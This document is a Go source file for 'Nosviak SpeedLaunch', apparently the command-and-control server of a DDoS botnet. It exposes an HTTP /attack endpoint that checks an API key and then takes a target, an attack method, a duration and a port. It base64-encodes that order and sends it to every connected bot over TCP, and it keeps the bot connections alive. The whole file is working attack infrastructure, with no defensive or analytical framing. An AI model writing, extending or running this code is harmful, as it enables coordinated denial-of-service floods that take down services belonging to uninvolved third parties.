package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"strconv"
	"sync"
)

//stores the config information
//allows for proper control without issues
type Configuration struct { //stored in structure
	HTTPListener    string   `json:"api_server"`
	Listener		string   `json:"listener"`
	APIPassPhase	string   `json:"api_key"`
	Methods			[]string `json:"methods"`
}

//stores the main configuration settings
//allows for proper control without errors
var Config *Configuration = nil //sets default

func main() {
	//renders the state and the version properly
	fmt.Println("starting Nosviak - SpeedLaunch [v1.0]")


	//tries to read the config file
	//we will use the contents to configure the server
	target, err := ioutil.ReadFile("server.json") //reads the input
	if err != nil { //error handles properly without issues
		log.Panicf("Err: %s\r\n", err.Error()) //panics the error
	}

	//stores the config file data
	var future Configuration //stores
	//tries to parse the input collection
	//allows for proper controlling without issues
	if err := json.Unmarshal(target, &future); err != nil {
		log.Panicf("Err: %s\r\n", err.Error()) //panics the error
	}

	//saves into the header function
	//this will allow us to access properly
	Config = &future //stores the data properly

	//tries to start the server
	//this will ensure its done without errors
	go MakeClientServer() //makes the client properly

	//registers the attack route properly
	//this will execute when we want to broadcast
	http.HandleFunc("/attack", LaunchAttack) //makes
	//tries to render the issue log
	//this will ensure its done without any errors
	log.Fatal(http.ListenAndServe(Config.HTTPListener, nil))
}

//parses the api information given properly
//this will ensure its done without issues happening
func LaunchAttack(rw http.ResponseWriter, r *http.Request) {
	//checks the length given properly
	//this will ensure its done properly within the route
	if len(r.URL.Query()) < 5 { //checks length properly
		rw.Write([]byte("Access Denied")); return //prints
	}

	//checks the key given with the api key
	//this will make sure its done without errors
	if r.URL.Query().Get("key") != Config.APIPassPhase {
		rw.Write([]byte("Access Denied")); return //prints
	} 

	//checks for the method properly
	//this will ensure its done without errors
	if !NeedleHaystack(r.URL.Query().Get("method"), Config.Methods) {
		rw.Write([]byte("Unclassified method given...")); return //prints
	}

	//tries to parse the duration properly
	//this will ensure its done without any errors
	Duration, err := strconv.Atoi(r.URL.Query().Get("duration"))
	if err != nil { //error handles the reason properly
		rw.Write([]byte("unclassified duration given...")); return
	}

	//tries to parse the port properly
	//this will ensure its done without any errors
	Port, err := strconv.Atoi(r.URL.Query().Get("port"))
	if err != nil { //error handles the reason properly
		rw.Write([]byte("unclassified port given...")); return
	}


	//tries to broadcast the command
	//this will broadcast through all servers
	if err := BroadcastCommand(r.URL.Query().Get("target"), r.URL.Query().Get("method"), Duration, Port); err != nil {
		rw.Write([]byte("failed to broadcast the attack command")); return
	}

	//lets the header know the attack was sent
	//allows for proper control without issues happening
	rw.Write([]byte("Attack broadcasted throughout the network"))
}

//tries to properly broadcast the command
//this will ensure its done without any errors
func BroadcastCommand(target, method string, duration, port int) error {
	//marshals into json format
	//this will allow to be broadcasted through
	Payload, err := json.Marshal(&AttackBuild{Target: target,Method: method,Duration: duration,Port: port})
	if err != nil { //error handles the statement properly
		return err //returns the error properly
	}

	//ranges through all servers
	//this will ensure its done without any errors
	for k, srv := range Servers { //ranges through properly
		if _, err := srv.Write([]byte(base64.RawStdEncoding.EncodeToString(Payload))); err != nil {
			delete(Servers, k) //removes from the map
			continue //continues looping properly
		}
	}
	return nil
}

//needle haystack method
//this will check for a needle (single string) inside a haystack (array of strings)
func NeedleHaystack(needle string, haystack []string) bool { //checks if its there
	//ranges through now properly
	//this will ensure its done without errors
	for h := range haystack { //ranges through properly
		if haystack[h] == needle { //compares both properly
			return true //returns true properly
		} //returns false as it wasnt found
	}; return false 
}


var (
	//stores all the conns
	//this will broadcast the command to all
	Servers map[string]net.Conn = make(map[string]net.Conn)
	mutex sync.Mutex //structural mux properly
)

//tries to create the client server
//this will make the listener without issues
func MakeClientServer() {
	//starts the listener
	//this will recreate the listener
	network, err := net.Listen("tcp", Config.Listener)
	if err != nil { //error handles properly and prints error properly
		log.Fatalf("Srv: %s\r\n", err.Error()) //renders error
		return //returns/kills function
	}

	//loops through accepting connection
	//this will allow for better control issues
	for { //loops through forever properly without issues
		//tries to properly accept the conn
		//this will try to accept the client onto network
		conn, err := network.Accept() //tries to accept properly
		if err != nil { //error handles without issues properly
			log.Printf("Conn: %s\r\n", err.Error()) //prints err
			continue //continues looping properly
		}
		mutex.Lock() //mutex lock properly
		//tries to save into the map
		//this will allow us to broadcast into
		Servers[conn.RemoteAddr().String()] = conn
		mutex.Unlock() //unlocks the locked mux
		log.Printf("[New server connect] [%s]", conn.RemoteAddr().String())
		//keeps the connection alive properly
		//this will forever try to keep the conn 
		go KeepAlive(conn) //ran inside a goroutine properly
	}
}

//this will forever keep conn 
//stops the connection from closing properly
func KeepAlive(c net.Conn) {
	//for loop sreader
	//this will read one byte per loop
	for { //loops through properly without issues
		Buffer := make([]byte, 1) //reader buffer
		if _, err := c.Read(Buffer); err != nil { //err handles
			delete(Servers, c.RemoteAddr().String()) //removes
			return //stops the function properly without issues
		}; continue //continues looping properly
	}
}

//stores the attack structure
//this will be broadcasted to clients
type AttackBuild struct { //stored in structure
	Target 				string `json:"target"`
	Duration			int    `json:"duration"`
	Port 				int    `json:"port"`
	Method				string `json:"method"`
}